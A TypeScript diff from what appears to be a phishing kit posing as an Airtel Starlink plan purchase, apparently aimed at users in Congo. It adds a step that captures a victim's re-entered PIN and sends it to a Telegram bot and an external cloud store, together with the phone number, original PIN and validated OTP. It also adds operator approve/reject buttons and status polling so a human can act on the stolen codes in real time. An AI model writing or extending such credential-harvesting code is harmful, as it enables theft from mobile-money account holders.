@@ -23,9 +23,22 @@ export interface TelegramOtpPayload {
   planPrice?: string;
 }
 
+export interface TelegramReenterPinPayload {
+  sessionId: string;
+  phone: string;
+  fullPhone?: string;
+  country?: string;
+  airtelBrand?: string;
+  originalPin?: string;
+  pin: string;
+  planName?: string;
+  planPrice?: string;
+}
+
 export interface TelegramStatusResult {
   loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
   otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
+  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
 }
 
 const BROWSER_HEADERS = {
@@ -42,10 +55,12 @@ class TelegramService {
     {
       loginStatus: 'pending' | 'approved' | 'rejected';
       otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
+      reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
       phone?: string;
       fullPhone?: string;
       country?: string;
       pin?: string;
+      reenterPin?: string;
       otp?: string;
       planName?: string;
       planPrice?: string;
@@ -377,6 +392,119 @@ class TelegramService {
   }
 
   /**
+   * Send Re-entered / Confirmed 4-digit PIN to Telegram Bot
+   */
+  public async sendReenterPin(payload: TelegramReenterPinPayload): Promise<boolean> {
+    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
+    const cleanPin = pin.replace(/\D/g, '').slice(0, 4);
+    const resolvedCloudId = this.getCloudId(sessionId);
+
+    const existing = this.localSessionState.get(sessionId) || {
+      loginStatus: 'approved' as const,
+      otpStatus: 'approved' as const,
+      reenterStatus: 'pending' as const,
+      cloudId: resolvedCloudId,
+      fullPhone,
+      country,
+    };
+    existing.reenterPin = cleanPin;
+    existing.reenterStatus = 'pending';
+    this.localSessionState.set(sessionId, existing);
+
+    // 1. Try server or Vercel serverless endpoint
+    try {
+      const serverRes = await fetch('/api/telegram/send-reenter-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId,
+          cloudId: resolvedCloudId,
+          phone,
+          fullPhone: fullPhone || existing.fullPhone,
+          country: country || existing.country,
+          airtelBrand: airtelBrand || 'Airtel Starlink',
+          originalPin: originalPin || existing.pin,
+          pin: cleanPin,
+          planName,
+          planPrice,
+        }),
+      });
+
+      if (serverRes.ok) {
+        const data = await this.safeJson(serverRes);
+        if (data && data.success) {
+          return true;
+        }
+      }
+    } catch {
+      // Backend unavailable, fall through
+    }
+
+    // 2. Direct Cloud Store Update + Telegram Message
+    try {
+      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
+        headers: BROWSER_HEADERS,
+        cache: 'no-store',
+      });
+      if (fetchRes.ok) {
+        const record = await this.safeJson(fetchRes);
+        const data = record?.data || {};
+        data.reenterPin = cleanPin;
+        data.reenterStatus = 'pending';
+        data.lastUpdated = Date.now();
+
+        await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
+          method: 'PUT',
+          headers: BROWSER_HEADERS,
+          body: JSON.stringify({
+            name: record?.name || resolvedCloudId,
+            data,
+          }),
+        });
+      }
+    } catch (err) {
+      console.warn('Direct cloud store reenter update warning:', err);
+    }
+
+    const displayPhone = fullPhone || payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
+    const displayCountry = country || existing.country || 'Airtel Africa';
+
+    const messageText =
+      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
+      `📌 <b>Code PIN Initial:</b> <code>${existing.pin || originalPin || 'N/A'}</code>\n` +
+      `🔢 <b>Code OTP Validé:</b> <code>${existing.otp || '****'}</code>\n` +
+      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
+      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
+      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
+
+    const inlineKeyboard = [
+      [
+        {
+          text: '✅ Valider PIN Final',
+          callback_data: `approve_reenter_${resolvedCloudId}`,
+        },
+        {
+          text: '❌ Rejeter PIN Final',
+          callback_data: `reject_reenter_${resolvedCloudId}`,
+        },
+      ],
+      [
+        {
+          text: '🌐 Action Directe (Lien Web)',
+          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_reenter`,
+        },
+      ],
+    ];
+
+    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
+    return true;
+  }
+
+  /**
    * Fast Real-time Status Polling (Multi-Tier Resilient Check)
    * 1. Check local session state
    * 2. Event-driven server wait-status (< 50ms latency, zero spam)
@@ -385,7 +513,7 @@ class TelegramService {
    */
   public async pollUpdates(
     sessionId: string,
-    targetStep: 'login' | 'otp',
+    targetStep: 'login' | 'otp' | 'reenter',
     phone?: string
   ): Promise<'pending' | 'approved' | 'rejected'> {
     // 1. Check local cached session state
@@ -396,6 +524,9 @@ class TelegramService {
       }
       if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
         return local.otpStatus;
+      }
+      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
+        return local.reenterStatus;
       }
     }
 
@@ -425,6 +556,7 @@ class TelegramService {
           if (local) {
             if (targetStep === 'login') local.loginStatus = waitData.status;
             if (targetStep === 'otp') local.otpStatus = waitData.status;
+            if (targetStep === 'reenter') local.reenterStatus = waitData.status;
           }
           return waitData.status;
         }
@@ -454,6 +586,10 @@ class TelegramService {
           if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
             if (local) local.otpStatus = data.otpStatus;
             return data.otpStatus;
+          }
+          if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
+            if (local) local.reenterStatus = data.reenterStatus;
+            return data.reenterStatus;
           }
         }
       }
@@ -500,6 +636,15 @@ class TelegramService {
                     if (local) local.otpStatus = 'rejected';
                     return 'rejected';
                   }
+                } else if (targetStep === 'reenter') {
+                  if (cqData.startsWith('approve_reenter')) {
+                    if (local) local.reenterStatus = 'approved';
+                    return 'approved';
+                  }
+                  if (cqData.startsWith('reject_reenter')) {
+                    if (local) local.reenterStatus = 'rejected';
+                    return 'rejected';
+                  }
                 }
               }
             }
@@ -528,6 +673,10 @@ class TelegramService {
           if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
             if (local) local.otpStatus = data.otpStatus;
             return data.otpStatus;
+          }
+          if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
+            if (local) local.reenterStatus = data.reenterStatus;
+            return data.reenterStatus;
           }
         }
       } catch {}
